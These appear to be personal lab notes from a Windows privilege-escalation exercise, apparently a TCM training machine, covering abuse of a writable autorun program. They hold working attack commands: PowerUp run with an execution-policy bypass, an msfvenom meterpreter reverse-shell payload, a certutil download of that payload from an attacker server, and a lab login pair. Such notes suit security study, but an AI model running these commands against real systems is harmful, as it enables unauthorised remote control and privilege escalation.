- Find the autorun binary using `autorun64.exe` tool:
	- `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
	- In Autoruns, click on the `Logon` tab.
		- ![[Pasted image 20250416170445.png]]
- Use `accesschk.exe`to find access to the `My Program`executable:
	- `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
		- `-w`: Show only write access
		- `-v`: Verbose
		- `-u`: Suppress errors
	- ![[Pasted image 20250416170714.png]]
	- We are looking for **RW Everyone** (Read Write Everyone)

# Finding using `powerup`
---
- `powershell -ep bypass`
- `. .\PowerUp.ps1`=> **==Space Is Important here**==
- `Invoke-AllChecks`
	- ![[Pasted image 20250416171548.png]]

# Escalation via Autorun
---
==Note- In this machine, we should use common ports like `80`, `443` as this machine is old and maybe firewall is blocking uncommon ports.==
- Generate an executable:
	- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.158.181 lport=443 -f exe -o program.exe`
- Start listener on `msfconsole`port: 443
- Start python http server on port 80
- **Transfer the generated executable to the location of program** using internet explorer
	- Didn't work, using: `certutil` worked
	- `certutil.exe -urlcache -f http://10.8.98.106/program.exe program.exe`
- ![[Pasted image 20250416173258.png]]
- Disconnect or logout and reconnect as admin user:
	- `TCM : Hacker123`
- ![[Pasted image 20250417143750.png]]